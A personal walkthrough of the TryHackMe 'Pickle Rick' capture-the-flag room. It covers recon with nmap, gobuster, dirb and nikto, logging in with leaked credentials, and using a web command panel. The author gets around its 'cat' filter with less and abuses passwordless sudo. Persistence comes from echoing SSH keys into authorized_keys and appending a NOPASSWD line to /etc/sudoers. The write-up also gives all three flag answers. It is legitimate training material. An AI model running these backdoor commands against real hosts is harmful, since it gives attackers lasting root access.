# Pickle Rick

## Background

This is a Rick & Morty themed web server / CTF. The fact that I've never watched the show may put me at a disadvantage.

There are three flags ("ingredients Rick needs for a potion to transform themself from a pickle back into a human"). Because of how TryHackMe masks answers, we already know the basic form of these strings (`*` characters are unknown, but ` ` and `.` characters are literals):

```
Flag 1: **. ******* ****
Flag 2: * ***** ****
Flag 3: ***** *****
```

I'm guessing that flag 1 begins with either numbers or an abbreviation (`Mr.`?). Flag 2 probably begins with `A`.

Because this is web server exploitation, it's going to make sense to use Burp Suite. In order to make the experience a little more pleasant, I'm going to add a pattern of `10.10.158.139` (the IP address of the TryHackMe server I'm using) to FoxyProxy and then set it to "Use proxies based on their pre-defined patterns and priorities"; that way, only the CTF website will get proxied to Burp Suite.

* [Rick and Morty (Wikipedia)](https://en.wikipedia.org/wiki/Rick_and_Morty)

## Recon

The server is running Apache 2.4.18 on some version of Ubuntu. The provided web page is very simple:

> HELP MORTY!
> 
> Listen Morty… I need your help, I've turned myself into a pickle again and this time I can't change back!
> 
> I need you to *BURRRP*… Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!

There is no obvious place to login, upload files, or otherwise interact with the web server. No hint event that this is anything beyond a relatively static site (both jQuery and Bootstrap libraries are included, but there's no hooks in the actual page.)

There's a comment in the HTML that Rick's username is `R1ckRul3s`.

We look for directories of interest using gobuster.

```bash
gobuster dir \
	-u http://10.10.158.139 \
	-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Discovered directories:

* /assets (website assets + a handful of Rick & Morty image files)
* /server-status (returns 403)

Also probing the machine using nmap.

```bash
nmap -vv -A -oA pickle-rick -sS -p- 10.10.158.139
```

```
# Nmap 7.91 scan initiated Sun Oct 10 14:17:34 2021 as: nmap -vv -A -oA pickle-rick -sS -p- 10.10.158.139
Nmap scan report for 10.10.158.139
Host is up, received echo-reply ttl 61 (0.16s latency).
Scanned at 2021-10-10 14:17:36 MDT for 862s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:39:9b:09:99:36:f3:bc:fe:7c:83:99:92:3b:a7:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNZgE8CuciddazUr3rzoeSLp5UUW7FSMH7iGPEnz6E0GioM0ctbDfUtlp2jEOcetG3lnKzzD1JMPBh98h7ImpMSdpOMHRliy58a5CaBDv7O2boOUYrw0BiL9xHjEoeewTuKqHrsOal+o2M/Cmiho6K0FcHBmmf0/COnaT824p6XK5z7PYLuwoMF2Ujimz2hIFCFRn3eID0nCiMXxOUVI0Gn+m1xSDdOIqO7n9btU0oknWQ/QHbEMwVi/Hdv5b7xoO/MqiEAKVmvmsA483n8+uqhjmVXeYr/r588dUod0M1EY56RLgeiSnFWZ5D1bGxknmd+wh64At8MG4jZyDEhuVZ
|   256 ab:aa:da:0b:5b:22:01:bc:75:54:91:e8:2a:b6:60:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP74j/YgHBTZzXewO7k01lKCsNhH0h+qZBH5pvKkwoLvkiwVrmFMphtT+cHsdV5KnijsoRQtMolZyblXdHbVoOQ=
|   256 7f:32:1f:37:2a:58:e7:d0:fb:91:a4:8c:12:8e:2e:d6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFz+Ck64qc+5h2JvTgz7WYaLU4z+yu79Ug8CaW2vgP/9
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/10%OT=22%CT=1%CU=34787%PV=Y%DS=4%DC=T%G=Y%TM=61634D
OS:BE%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%T
OS:S=8)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST
OS:11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=6
OS:8DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M
OS:506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.017 days (since Sun Oct 10 14:06:48 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   31.96 ms  10.13.0.1
2   ... 3
4   172.74 ms 10.10.158.139

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 10 14:31:58 2021 -- 1 IP address (1 host up) scanned in 864.62 seconds
```

Try to get some more information by connecting with ssh.

```bash
ssh -v -F /dev/null \
    -o IdentityAgent=none R1ckRul3s@10.10.158.139
```

Looks like password authentication is turned off - only the `publickey` method is available. So no brute forcing here - we need Rick's private SSH key.

No obvious Apache or SSH RCEs for this version in Exploit DB…

At this point I'm basically stuck, so I decide to see if I can get a hint by (partially!) reading someone else's walk-through. Most of the initial recon in that walk-through (I only scanned down that far) aligns with what I've already done, but it mentions two tools I've not yeat heard of - dirb (which looks like gobuster but possibly more straight-forward) and nikto (which I know *of* but not *about*). So let's try those!

```bash
dirb http://10.10.158.139
```

The dirb command finds everything that gobuster did, as well as a robots.txt file. This file contains a single "word": `Wubbalubbadubdub`. That doesn't mean anything to me really (maybe it's something that Rick would say), but maybe there will be a password field that I could try it out in…

```bash
nikto -host 10.10.158.139
```

Nikto is a scanner for common web vulnerabilities. A couple of interesting things pop out from the scanning of the target system:

* Despite the simple page, it looks like the server is running PHP. So if I can figure out how to upload something, I've got a good shot at popping a reverse shell.
* There's a /login.php file. Now THAT looks interesting!

* [TryHackMe Pickle Rick CTF Walkthrough](https://razrexe.medium.com/tryhackme-pickle-rick-ctf-walkthrough-9ed36eff17fe)

## Flag 1

Let's check out /login.php. This looks like a pretty straight-forward login page. No special headers show up when intercepting the response in Burp Suite, and again no JavaScript outside of the standard jQuery and Bootstrap libraries is loaded.

Let's try R1ckRul3s:Wubbalubbadubdub for our username:password.

And, with a redirect to /portal.php, we're in!

Let's poke around here a bit.

All of the links on this page *except* for the first one ("Commands") go to /denied.php. That page again doesn't include anything interesting (jQuery, Bootstrap, blah blah blah).

So all we've got is the mysterious "Command Panel". There is also an HTML comment in the source of /portal.php with what *looks* like a base64-encoded string in it. But feeding this to `base64 -d` just results in an `invalid input` error.

```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

Let's turn back to "Command Panel" and see what that does. Typing in `ls` reveals what looks like a listing of the website root directory! Two new files here:

* /Sup3rS3cretPickl3Ingred.txt
* /clue.txt

Viewing /Sup3rS3cretPickl3Ingred.txt revels the first flag:

```
mr. meeseek hair
```

## Flag 2

Let's continue poking around. Before we go back to /portal.php, let's take a look at /clue.txt

```/clue.txt
Look around the file system for the other ingredient.
```

Well, thank you Captain Obvious.

Let's see what we can do with the "Command Panel".

* `cat Sup3rS3cretPickl3Ingred.txt` reveals that cat is disabled.
* `ls /` reveals that we can list things outside of the webroot.
* `ls /home` reveals two users: rick and ubuntu (so trying to SSH in as R1ckRul3s wouldn't have worked anyway).
* `ls -la /home/rick` reveals a `second ingredients` file… But no .ssh directory! Damnit.
* `ls -la /home/ubuntu` does reveal an .ssh directory, but we can't actually descend into it.

Alright, so `cat` is disabled. But can I get at it another way? `bash -c "cat Sup3rS3cretPickl3Ingred.txt"` also doesn't work. Neither does `more Sup3rS3cretPickl3Ingred.txt`. But `less Sup3rS3cretPickl3Ingred.txt` does work!

Let's get that second flag by executing `less "/home/rick/second ingredients"`.

```
1 jerry tear
```

## Flag 3

Let's get us some filesystem access. On a lark, I tried the command `sudo whoami`… And the answer is `root`! Jackpot!

Though `sudo less /etc/sudoers` reveals that www-data has full sudo access without a password, so it's really just as good.

And… `sudo ls -la /home/ubuntu/.ssh` reveals no private SSH key.

Doing `less portal.php` reveals that the mystery string is simply hard-coded, and nothing interesting is hidden in the other PHP files.

I'm not sure where the final flag is, but I have enough access now to pop a full root shell. Unfortunately, I can't seem to start nc through the "Command Panel", so we'll just do this the noisy way.

First, on my local system create a new temporary SSH key pair using `ssh-keygen -f ~/id_rsa`. Then, enter the following commands in the "Command Panel":

```bash
sudo bash -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN" > /home/ubuntu/.ssh/authorized_keys'
sudo bash -c 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDpkAlZ1jLStW6nS1xFc36hEkuCH20Ef2oJqq/C1kkUBJTyYgxK+0MgGeqfLTbKKWiEOfLyoOK805WbBcgaR1vzB7PIxzV8e1hjzn0yQrDjpfMd3Pf+fvxWaQNrDZ183VeNyOnEL7lbN7xNmCn2nMVkhVGalGDyxKOB8JMusnAD0HdRRtCYPMiBbQjImBtiGkwjo+5soxOteZBrcImcuiJqqSTcEhyxGQo7rf4gBSdLn1uOgwfZeOw1PnuLHAFizUdjOCDYXx0QAMTj9Kx3AmoNisP1p2XsqfFOY8MW+pEloFskMC4XWpZAP84PVFGXhk0L9VkkzRSoFV/5B6fw+T5oeQVv8lHULSRu81iVOvLf9pT+DaOUzQTvbOe/D7djrKYzE2r1AcMmBXhIK34rzAHW2fgUqMfkA6G4LJaPlEXLs2U8kRvzU5tXb+42xmYFFe76j6BumHX+w9AVn4ZqAaiASQm/I6rK9fmlGkkKmykCkAZUEGcICLOVjmk7B0Qk/c= kali@kali" >> /home/ubuntu/.ssh/authorized_keys'
sudo chown ubuntu.ubuntu /home/ubuntu/.ssh/authorized_keys
sudo chmod 600 /home/ubuntu/.ssh/authorized_keys
sudo bash -c 'echo "ubuntu ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'
```

(NOTE: The "Command Panel" does a simple string match looking for "cat", "more", "tail", "nano", "vim", and "vi". The last one in particular can be a little problematic… You may have to run `ssh-keygen` a couple of times to get a key without "vi" as a substring.)

We can now access the box directly over SSH as the ubuntu user, and from there elevate to root using sudo.

```bash
ssh -i ~/id_rsa -F /dev/null \
    -o IdentityAgent=none ubuntu@10.10.158.139
```

Though it turns out that I didn't have to go this far… The third flag is just in the .bash_history file of the ubuntu user.

```bash
ll
sudo apt-get install apache2
ls
ls -la
exit
3rd ingredients: fleeb juice
find / -name php.ini
sudo find / -name php.ini
sudo rm -rf /var/lib/php/session/* 
cat /etc/php/7.0/fpm/php.ini
cat /etc/php/7.0/fpm/php.ini | grep session
cd /var/lib/php/sessions
ls
sudo ls
sudo rm -rf sess_n16aanckg2ifmk12io64o1kfa2
sudo ls
```

```
fleeb juice
```

Oh well, I still got a root shell (albeit in a totally noisy fashion).

ELAPSED TIME: 3 h 11 min

## References

* [TryHackMe: Pickle Rick](https://tryhackme.com/room/picklerick)
